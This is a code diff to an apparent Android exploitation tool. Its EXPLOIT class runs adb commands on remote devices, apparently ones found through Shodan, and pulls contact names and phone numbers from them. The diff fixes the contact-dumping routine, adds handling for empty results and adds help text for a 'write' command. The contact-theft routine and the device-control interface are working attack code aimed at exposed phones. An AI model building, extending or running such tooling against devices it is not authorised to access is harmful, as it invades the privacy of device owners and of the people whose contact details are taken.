@@ -118,7 +118,7 @@ class MAIN:
     
     def disconnect(self,x=None):
         if x != None: os.system("adb disconnect "+x+" > /dev//null"); print("* success disconnecting: "+x)
-        else: os.system("adb disconnect"); print("* success disconnecting all devices")
+        else: os.system("adb disconnect > /dev//null"); print("* success disconnecting all devices")
 
     def shodan_init(self, apikey):
         os.system("shodan init "+apikey+" > logs/shodan_init.log")
@@ -396,16 +396,19 @@ class EXPLOIT:
         if "com.android.contacts" in app or "com.android.contact" in app:
             os.system("adb -s "+serial+" shell content query --uri content://contacts/phones/ --projection display_name:number > logs/getcontact.log")
             if os.path.isfile("logs/getcontact.log"):
-                os.system("cat logs/getcontact.log | grep Row > logs/getcontact-row.log;sed -i -e 's/ //g;s/Row://g;s/display_name=/,/g;s/number=//g;s/*//g;s/#//g;s/+//g;s/-//g;s/.$//g' logs/getcontact-row.log")
-                for lines in open("results/getcontact-row.log","r").read().splitlines():
-                    lines=lines.split(",")
-                    if len(lines) == 3:
-                        table.add_row(
-                            lines[0],lines[1],lines[2]
-                            )
-                    else: continue
-                console.print(table)
-                os.system("rm -rf logs/getcontact* > /dev//null")
+                if "No result found." in open("logs/getcontact.log","r").readline().strip():
+                    print("* oops no contact found on this devices")
+                else:
+                    os.system("cat logs/getcontact.log | grep Row > logs/getcontact-row.log;sed -i -e 's/ //g;s/Row://g;s/display_name=/,/g;s/number=//g;s/*//g;s/#//g;s/+//g;s/-//g;s/.$//g' logs/getcontact-row.log")
+                    for lines in open("logs/getcontact-row.log","r").read().splitlines():
+                        lines=lines.split(",")
+                        if len(lines) == 3:
+                            table.add_row(
+                                lines[0],lines[1],lines[2]
+                                )
+                        else: continue
+                    console.print(table)
+                    os.system("rm -rf logs/getcontact* > /dev//null")
             else: print("* failed to get contact from this devices")
         else: print("* oops no contact found on this devices")
     
@@ -502,6 +505,13 @@ class EXPLOIT:
             print(w+"   reboot --recovery")
             print(w+"   reboot --bootloader")
             print(w)
+        elif num == int(6):
+            print(w)
+            print(w+"<usage>")
+            print(w+"   write <text>")
+            print(w+"<example>")
+            print(w+"   write HelloWorld!")
+            print(w)
         else: pass
     
     def start(self, serial):
@@ -519,6 +529,7 @@ class EXPLOIT:
                     elif commands == "pull": self.help(3)
                     elif commands == "push": self.help(4)
                     elif commands == "reboot": self.help(5)
+                    elif commands == "write": self.help(6)
                     elif commands == "clear": os.system("clear")
                     elif commands == "exit": break
                     elif commands == "shell": print("* trying to swicth into shell interface: "+serial+"\n"); self.shell(serial)
